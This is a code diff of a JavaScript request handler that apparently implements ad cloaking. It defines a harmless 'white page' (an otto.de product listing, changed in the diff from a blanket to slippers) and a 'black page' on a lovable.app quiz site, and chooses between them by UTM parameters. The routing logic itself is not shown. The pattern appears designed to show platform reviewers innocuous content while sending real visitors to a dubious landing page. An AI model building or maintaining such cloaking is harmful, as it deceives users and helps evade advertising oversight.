@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/wohndecke-soft-design91-streifen-steppung-gestreifte-decke-gesteppte-sofadecke-S0KC90BC/";
+    const whitePageURL = "https://www.otto.de/p/filsko-kramfors-winter-filz-hausschuhe-fuer-herren-hausschuh-mit-reissverschluss-S06250MH/";
     const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
